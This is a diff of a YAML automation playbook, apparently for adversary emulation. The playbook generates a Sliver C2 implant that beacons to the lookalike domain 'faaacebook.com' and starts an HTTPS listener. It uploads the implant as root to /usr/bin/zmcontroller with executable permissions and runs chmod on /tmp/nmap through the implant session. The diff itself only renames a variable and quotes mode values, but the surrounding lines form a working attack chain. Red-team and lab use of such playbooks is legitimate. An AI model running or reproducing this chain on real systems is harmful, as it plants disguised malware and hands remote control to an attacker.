@@ -27,7 +27,6 @@ commands:
     cmd: "generate_implant"
     c2url: "https://faaacebook.com"
     name: "superimplant"
-    filepath: $IMPLANTPATH
 
   - type: sliver
     cmd: start_https_listener
@@ -39,9 +38,9 @@ commands:
 
   - type: sftp
     cmd: put
-    local_path: "$IMPLANTPATH"
+    local_path: "$LAST_SLIVER_IMPLANT"
     remote_path: /usr/bin/zmcontroller
-    mode: 755
+    mode: "755"
     session: "root"
 
   - type: ssh
@@ -156,7 +155,7 @@ commands:
     cmd: execute
     exe: chmod
     args:
-      - 755
+      - "755"
       - /tmp/nmap
     session: superimplant
 
